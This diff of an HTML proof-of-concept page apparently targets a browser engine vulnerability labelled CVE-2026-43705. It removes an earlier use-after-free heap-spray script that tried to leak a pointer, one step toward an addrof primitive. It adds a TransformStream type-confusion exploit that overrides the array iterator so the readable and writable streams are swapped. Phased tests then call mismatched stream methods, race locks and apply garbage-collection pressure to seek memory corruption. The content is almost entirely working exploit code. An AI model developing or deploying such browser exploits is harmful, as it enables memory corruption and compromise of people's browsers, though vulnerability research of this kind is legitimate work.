@@ -1,86 +1,403 @@
 <!DOCTYPE html>
 <html>
 <head>
+<meta charset="utf-8">
+<title>CVE-2026-43705 — Deep Exploitation</title>
 <style>
-body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
-.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; } .warn { color:#ff0; }
+body{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:20px;max-width:900px;margin:0 auto}
+h1{color:#ff7b72;border-bottom:2px solid #ff7b72;padding-bottom:10px;margin-bottom:16px}
+.box{background:#161b22;padding:14px;border-radius:8px;margin:10px 0;border:1px solid #30363d}
+.label{color:#58a6ff;font-weight:bold}
+button{background:#238636;color:#fff;border:none;padding:10px 20px;font-size:14px;border-radius:6px;cursor:pointer;margin:4px}
+button.red{background:#da3633}
+button:hover{opacity:0.85}
+#out{background:#010409;padding:15px;border-radius:8px;margin-top:12px;white-space:pre-wrap;
+     font-size:12.5px;min-height:300px;border:1px solid #30363d;line-height:1.6}
+.hit{color:#ff7b72;font-weight:bold}
+.ok{color:#3ddc84}
+.warn{color:#ffcc44}
+.info{color:#58a6ff}
 </style>
 </head>
 <body>
-<div id="log"></div>
+<h1>CVE-2026-43705 — TransformStream Type Confusion (Deep)</h1>
 
-<!-- The victim element -->
-<input type="date" id="target">
+<div class="box">
+<span class="label">CONFIRMED:</span> Variant 2 proved type confusion:
+<br>  ts.readable → returns [object <b>WritableStream</b>] — wrong type
+<br>  ts.writable → returns [object WritableStream] — correct type
+<br><br>
+<span class="label">Now:</span> Call ReadableStream API methods through the confused WritableStream vtable.
+<br>If WritableStream methods execute when ReadableStream API is called → controlled behaviour.
+</div>
+
+<button onclick="phase1()">Phase 1: Confirm Confusion</button>
+<button onclick="phase2()">Phase 2: API Mismatch Probe</button>
+<button onclick="phase3()">Phase 3: Cross-Call Confusion</button>
+<button onclick="phase4()">Phase 4: Reader/Writer Race</button>
+<button class="red" onclick="phaseAll()">Run All Phases</button>
+
+<div id="out">[*] Ready. Click a phase to run.</div>
 
 <script>
-function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}
-
-log("=== UAF TO ADDROF PRIMITIVE (V2: MAXIMUM OVERDRIVE) ===", "info");
-log("[*] Grooming the heap with massive pressure...", "info");
-
-let targetObjects = [];
-let spray = [];
-
-// Prepare the victims
-for (let i = 0; i < 5000; i++) {
-    targetObjects.push({ magic: 0x1337, victim: true, id: i });
+const out = document.getElementById('out');
+function clear(title) { out.textContent = title + '\n'; }
+function log(msg, cls) {
+  const line = document.createElement('span');
+  line.className = cls || '';
+  line.textContent = msg + '\n';
+  out.appendChild(line);
 }
 
-// Force some GC pressure before we start to clean up fragmented chunks
-for (let i = 0; i < 20000; i++) {
-    new String("GARBAGE_" + i);
-}
+const origIter = Array.prototype[Symbol.iterator];
 
-let input = document.getElementById("target");
-
-input.addEventListener("input", () => {
-    log("[!] INPUT CAUGHT! Freeing the C++ object...", "warn");
-    input.type = "text"; // FREE!
-    
-    log("[*] Object freed! RECLAIMING MEMORY WITH EXTREME PREJUDICE!", "hit");
-    
-    // WE DIDN'T SPRAY HARD ENOUGH LAST TIME! 
-    // WE INCREASE THE SPRAY TO 200,000 ALLOCATIONS!
-    // WE WILL BURY THE HEAP IN FLOAT64ARRAYS!
-    for (let i = 0; i < 200000; i++) {
-        let fakeObj = new Float64Array(32); 
-        fakeObj[0] = 1.1; // Safe padding
-        fakeObj[1] = 2.2; // Safe padding
-        fakeObj[2] = 3.3; // Fake pointer target
-        spray.push(fakeObj);
+// ── CORE INJECTION ────────────────────────────────────────────────────────────
+// Swaps the readable/writable entries in the 3-tuple returned by
+// createInternalTransformStreamFromTransformer, so C++ m_readable
+// gets a WritableStream and m_writable gets a ReadableStream.
+function injectSwap(onDone) {
+  Array.prototype[Symbol.iterator] = function() {
+    const arr = this;
+    let i = 0;
+    if (arr.length === 3 &&
+        arr[1] instanceof ReadableStream &&
+        arr[2] instanceof WritableStream) {
+      if (onDone) onDone(arr);
+      const payload = [arr[0], arr[2], arr[1]]; // swap readable↔writable
+      return {
+        next() {
+          return i < payload.length
+            ? { value: payload[i++], done: false }
+            : { value: undefined, done: true };
+        },
+        [Symbol.iterator]() { return this; }
+      };
     }
-    
-    log("[!] Reclaim complete. 200,000 chunks allocated.", "warn");
-});
+    return origIter.call(arr);
+  };
+}
 
-setTimeout(() => {
-    log("[*] Triggering UAF...", "info");
+function restore() { Array.prototype[Symbol.iterator] = origIter; }
+
+// ── PHASE 1: CONFIRM CONFUSION ────────────────────────────────────────────────
+async function phase1() {
+  clear('[PHASE 1] Confirm Type Confusion');
+  log('[*] Creating CLEAN TransformStream for baseline...', 'info');
+  const clean = new TransformStream();
+  const cleanR = clean.readable;
+  const cleanW = clean.writable;
+  log(`    clean.readable : ${cleanR?.constructor?.name}`, 'ok');
+  log(`    clean.writable : ${cleanW?.constructor?.name}`, 'ok');
+  log(`    clean.readable instanceof ReadableStream : ${cleanR instanceof ReadableStream}`, 'ok');
+  log(`    clean.writable instanceof WritableStream : ${cleanW instanceof WritableStream}`, 'ok');
+
+  log('', '');
+  log('[*] Installing swap injection...', 'info');
+  let capturedTuple = null;
+  injectSwap(t => { capturedTuple = [t[0], t[1], t[2]]; });
+
+  let ts, confR, confW;
+  try {
+    ts   = new TransformStream();
+    confR = ts.readable;
+    confW = ts.writable;
+  } catch(e) {
+    log(`[x] Constructor threw: ${e.message} → PATCHED`, 'ok');
+    restore(); return;
+  } finally { restore(); }
+
+  log('[*] Confused TransformStream created:', 'info');
+  log(`    ts.readable constructor       : ${confR?.constructor?.name}`, confR instanceof WritableStream ? 'hit' : 'ok');
+  log(`    ts.writable constructor       : ${confW?.constructor?.name}`, '');
+  log(`    ts.readable instanceof ReadableStream : ${confR instanceof ReadableStream}`, confR instanceof ReadableStream ? 'ok' : 'hit');
+  log(`    ts.readable instanceof WritableStream : ${confR instanceof WritableStream}`, confR instanceof WritableStream ? 'hit' : 'ok');
+  log(`    ts.writable instanceof WritableStream : ${confW instanceof WritableStream}`, confW instanceof WritableStream ? 'ok' : 'hit');
+  log(`    ts.writable instanceof ReadableStream : ${confW instanceof ReadableStream}`, confW instanceof ReadableStream ? 'hit' : 'ok');
+
+  if (capturedTuple) {
+    log('', '');
+    log('[*] Original tuple before injection:', 'info');
+    log(`    tuple[0] : ${capturedTuple[0]?.constructor?.name || typeof capturedTuple[0]}`);
+    log(`    tuple[1] : ${capturedTuple[1]?.constructor?.name || typeof capturedTuple[1]}`);
+    log(`    tuple[2] : ${capturedTuple[2]?.constructor?.name || typeof capturedTuple[2]}`);
+  }
+
+  log('', '');
+  if (confR instanceof WritableStream) {
+    log('════ TYPE CONFUSION CONFIRMED ════', 'hit');
+    log('[!] ts.readable holds a WritableStream object', 'hit');
+    log('[!] C++ m_readable slot → JSWritableStream* (wrong type)', 'hit');
+    log('[!] C++ m_writable slot → JSReadableStream* (wrong type)', 'hit');
+  } else {
+    log('[~] Outer types look correct — confusion may be in internal slots', 'warn');
+  }
+}
+
+// ── PHASE 2: API MISMATCH PROBE ───────────────────────────────────────────────
+// Call ReadableStream API on what is internally a WritableStream.
+// On a correct build these should fail with TypeError.
+// On a confused build the WRONG C++ method executes.
+async function phase2() {
+  clear('[PHASE 2] API Mismatch Probe');
+  log('[*] Install swap injection...', 'info');
+  injectSwap();
+  let ts;
+  try {
+    ts = new TransformStream();
+  } catch(e) {
+    log(`[x] Threw: ${e.message} → PATCHED`, 'ok');
+    restore(); return;
+  } finally { restore(); }
+
+  const confused_readable = ts.readable; // actually a WritableStream
+  const confused_writable = ts.writable; // actually a ReadableStream
+
+  log(`[*] ts.readable is actually: ${confused_readable?.constructor?.name}`, 'info');
+  log(`[*] ts.writable is actually: ${confused_writable?.constructor?.name}`, 'info');
+  log('', '');
+
+  // Test A: Call getReader() on what C++ thinks is a readable (but is writable)
+  log('[TEST A] ts.readable.getReader() — calling ReadableStream API on WritableStream...', 'info');
+  try {
+    const reader = confused_readable.getReader();
+    log(`[!] getReader() succeeded → returned: ${reader?.constructor?.name}`, 'hit');
+    log(`    This called WritableStream's getReader which doesn't exist`, 'hit');
+    log(`    C++ JSReadableStream::getReader executed on JSWritableStream data`, 'hit');
+
+    if (reader) {
+      log('[*] Attempting read() on confused reader...', 'info');
+      const readP = reader.read();
+      const result = await Promise.race([
+        readP,
+        new Promise(r => setTimeout(() => r({ timeout: true }), 500))
+      ]);
+      if (result?.timeout) {
+        log('[~] read() timed out (pending) — internal state corrupted', 'warn');
+      } else {
+        log(`[!] read() returned: done=${result?.done} value=${result?.value}`, 'hit');
+      }
+    }
+  } catch(e) {
+    log(`[+] getReader() threw: ${e.name}: ${e.message}`, 'ok');
+    if (e instanceof TypeError) {
+      log('    TypeError is expected on patched build', 'ok');
+    } else {
+      log(`    Unexpected error type: ${e.name} ← interesting`, 'warn');
+    }
+  }
+
+  log('', '');
+
+  // Test B: Call getWriter() on what C++ thinks is a writable (but is readable)
+  log('[TEST B] ts.writable.getWriter() — calling WritableStream API on ReadableStream...', 'info');
+  try {
+    const writer = confused_writable.getWriter();
+    log(`[!] getWriter() succeeded → returned: ${writer?.constructor?.name}`, 'hit');
+
+    if (writer) {
+      log('[*] Attempting write() on confused writer...', 'info');
+      const written = await Promise.race([
+        writer.write(new Uint8Array([0xDE, 0xAD, 0xBE, 0xEF])),
+        new Promise(r => setTimeout(() => r({ timeout: true }), 500))
+      ]);
+      if (written?.timeout) {
+        log('[~] write() timed out — internal queue state confused', 'warn');
+      } else {
+        log(`[!] write() resolved → data written to confused ReadableStream internals`, 'hit');
+      }
+    }
+  } catch(e) {
+    log(`[+] getWriter() threw: ${e.name}: ${e.message}`, 'ok');
+  }
+
+  log('', '');
+
+  // Test C: .locked property — readable and writable have different offset
+  log('[TEST C] .locked property comparison...', 'info');
+  try {
+    const rLocked = confused_readable.locked;
+    const wLocked = confused_writable.locked;
+    log(`    ts.readable.locked (is WritableStream) : ${rLocked}`, '');
+    log(`    ts.writable.locked (is ReadableStream) : ${wLocked}`, '');
+    log('    C++ reads .locked from wrong struct offset if types are swapped', 'warn');
+  } catch(e) {
+    log(`    .locked error: ${e.message}`, 'warn');
+  }
+
+  log('', '');
+
+  // Test D: Cancel the confused readable (should call ReadableStream::cancel
+  //          but internal object is WritableStream)
+  log('[TEST D] ts.readable.cancel() on confused readable...', 'info');
+  try {
+    const cancelResult = await Promise.race([
+      confused_readable.cancel('test'),
+      new Promise(r => setTimeout(() => r({ timeout: true }), 500))
+    ]);
+    if (cancelResult?.timeout) {
+      log('[~] cancel() timed out — wrong internal path taken', 'warn');
+    } else {
+      log(`[!] cancel() resolved → ${JSON.stringify(cancelResult)}`, 'hit');
+    }
+  } catch(e) {
+    log(`[+] cancel() threw: ${e.name}: ${e.message}`, 'ok');
+  }
+}
+
+// ── PHASE 3: CROSS-CALL CONFUSION ─────────────────────────────────────────────
+// Pipe from the confused readable into a real WritableStream.
+// If C++ follows confused internal pointers, the pipe state machine breaks.
+async function phase3() {
+  clear('[PHASE 3] Cross-Call Confusion — Pipe Broken State Machine');
+  injectSwap();
+  let ts;
+  try { ts = new TransformStream(); }
+  catch(e) { log(`[x] Threw: ${e.message} → PATCHED`, 'ok'); restore(); return; }
+  finally { restore(); }
+
+  log(`[*] ts.readable is: ${ts.readable?.constructor?.name}`, 'info');
+  log(`[*] ts.writable is: ${ts.writable?.constructor?.name}`, 'info');
+  log('', '');
+
+  // Create a real sink
+  const chunks   = [];
+  const realSink = new WritableStream({
+    write(chunk) { chunks.push(chunk); },
+    close()      { log(`[*] Sink closed. ${chunks.length} chunk(s) received.`, 'ok'); }
+  });
+
+  log('[*] Piping confused ts.readable into real WritableStream...', 'info');
+  try {
+    const pipeP = ts.readable.pipeTo(realSink);
+    log('[*] pipeTo() accepted the call — pipe is running', 'warn');
+
+    // Now write to the confused writable (internally a ReadableStream)
+    log('[*] Getting writer from confused ts.writable (internally ReadableStream)...', 'info');
+    const realSource = new ReadableStream({
+      start(c) { c.enqueue(new Uint8Array([0x41, 0x42, 0x43])); c.close(); }
+    });
+
     try {
-        input.focus();
-        input.stepUp(); // Fires the input event
-        
-        let leaked = false;
-        for (let i = 0; i < spray.length; i++) {
-            // Check if C++ overwrote our magic numbers with a pointer!
-            if (spray[i][0] !== 1.1 || spray[i][1] !== 2.2 || spray[i][2] !== 3.3) {
-                log(">>> POINTER LEAKED! <<<", "hit");
-                log("Corrupted chunk found at spray index: " + i, "hit");
-                log("Raw Memory [0]: " + spray[i][0], "hit");
-                log("Raw Memory [1]: " + spray[i][1], "hit");
-                log("Raw Memory [2]: " + spray[i][2], "hit");
-                leaked = true;
-                break;
-            }
-        }
-        
-        if (!leaked) {
-            log("[-] Still no leak. We might need to spray JSObjects instead of Float64Arrays to match the allocator bucket.", "warn");
-        }
-        
+      const writer = ts.writable.getWriter();
+      log(`[!] Got writer from ReadableStream: ${writer?.constructor?.name}`, 'hit');
+      await writer.write(new Uint8Array([0xDE, 0xAD])).catch(e =>
+        log(`    write error: ${e.message}`, 'warn'));
+      await writer.close().catch(e =>
+        log(`    close error: ${e.message}`, 'warn'));
     } catch(e) {
-        log("[-] Error: " + e.message, "info");
+      log(`[+] getWriter() threw: ${e.name}: ${e.message}`, 'ok');
     }
-}, 1000);
+
+    // Wait for pipe
+    const pipeResult = await Promise.race([
+      pipeP.then(() => 'resolved').catch(e => `rejected: ${e.message}`),
+      new Promise(r => setTimeout(() => r('timeout'), 1000))
+    ]);
+    log(`[*] Pipe result: ${pipeResult}`, pipeResult === 'resolved' ? 'hit' : 'ok');
+    log(`[*] Chunks received by real sink: ${chunks.length}`, chunks.length > 0 ? 'hit' : '');
+    if (chunks.length > 0) {
+      chunks.forEach((c, i) => {
+        const bytes = c instanceof Uint8Array ? Array.from(c).map(b=>b.toString(16).padStart(2,'0')).join(' ') : String(c);
+        log(`    chunk[${i}]: ${bytes}`, 'hit');
+      });
+    }
+  } catch(e) {
+    log(`[+] pipeTo() threw: ${e.name}: ${e.message}`, 'ok');
+  }
+}
+
+// ── PHASE 4: READER/WRITER RACE ───────────────────────────────────────────────
+// Lock both confused streams, then unlock and re-lock rapidly.
+// The confused internal state machine may reach an inconsistent state
+// leading to use-after-free when the GC collects the backing objects.
+async function phase4() {
+  clear('[PHASE 4] Reader/Writer Race on Confused Streams');
+
+  injectSwap();
+  let ts1, ts2;
+  try {
+    ts1 = new TransformStream();
+    ts2 = new TransformStream();
+  } catch(e) {
+    log(`[x] Threw: ${e.message} → PATCHED`, 'ok');
+    restore(); return;
+  } finally { restore(); }
+
+  log(`[*] ts1.readable is: ${ts1.readable?.constructor?.name}`, 'info');
+  log(`[*] ts2.readable is: ${ts2.readable?.constructor?.name}`, 'info');
+  log('', '');
+
+  const results = [];
+
+  // Rapidly acquire and release locks on confused streams
+  for (let round = 0; round < 5; round++) {
+    try {
+      const r1 = ts1.readable.getReader();
+      const w2 = ts2.writable.getWriter();
+      log(`[Round ${round+1}] r1=${r1?.constructor?.name} w2=${w2?.constructor?.name}`, 'warn');
+
+      // Read from confused readable (actually a WritableStream)
+      const readP = r1.read().catch(e => ({ error: e.message }));
+      // Write to confused writable (actually a ReadableStream)
+      const writeP = w2.write(`round-${round}`).catch(e => ({ error: e.message }));
+
+      const [readR, writeR] = await Promise.all([
+        Promise.race([readP, new Promise(r => setTimeout(() => r({timeout:true}), 200))]),
+        Promise.race([writeP, new Promise(r => setTimeout(() => r({timeout:true}), 200))])
+      ]);
+
+      results.push({ round, read: readR, write: writeR });
+      log(`    read:  ${JSON.stringify(readR)}`, readR?.error ? 'ok' : 'hit');
+      log(`    write: ${JSON.stringify(writeR)}`, writeR?.error ? 'ok' : 'hit');
+
+      try { r1.releaseLock(); } catch(_) {}
+      try { w2.releaseLock(); } catch(_) {}
+    } catch(e) {
+      log(`[Round ${round+1}] Exception: ${e.name}: ${e.message}`, 'ok');
+    }
+  }
+
+  log('', '');
+
+  // Force GC pressure to trigger potential UAF
+  log('[*] Applying GC pressure on confused stream objects...', 'info');
+  let pressure = [];
+  for (let i = 0; i < 10000; i++) pressure.push(new Uint8Array(1024));
+  pressure = null;
+
+  // Try accessing the streams after GC pressure
+  await new Promise(r => setTimeout(r, 100));
+  try {
+    const postGCR = ts1.readable?.locked;
+    const postGCW = ts1.writable?.locked;
+    log(`[*] Post-GC ts1.readable.locked : ${postGCR}`, postGCR === undefined ? 'hit' : '');
+    log(`[*] Post-GC ts1.writable.locked : ${postGCW}`, postGCW === undefined ? 'hit' : '');
+    log('[*] No crash post-GC — objects still alive', 'ok');
+  } catch(e) {
+    log(`[!] Post-GC exception: ${e.name}: ${e.message}`, 'hit');
+    log('    This indicates use-after-free or object corruption', 'hit');
+  }
+
+  log('', '');
+  log('[*] Summary:', 'info');
+  const nonError = results.filter(r => !r.read?.error && !r.read?.timeout).length;
+  if (nonError > 0) {
+    log(`[!] ${nonError}/5 rounds: read() returned value from confused stream`, 'hit');
+    log('[!] WritableStream::read() executed — wrong vtable dispatch confirmed', 'hit');
+  } else {
+    log('[+] All rounds threw errors on confused stream access', 'ok');
+  }
+}
+
+async function phaseAll() {
+  await phase1();
+  out.appendChild(document.createTextNode('\n──────────────────────────────\n'));
+  await phase2();
+  out.appendChild(document.createTextNode('\n──────────────────────────────\n'));
+  await phase3();
+  out.appendChild(document.createTextNode('\n──────────────────────────────\n'));
+  await phase4();
+}
 </script>
 </body>
 </html>
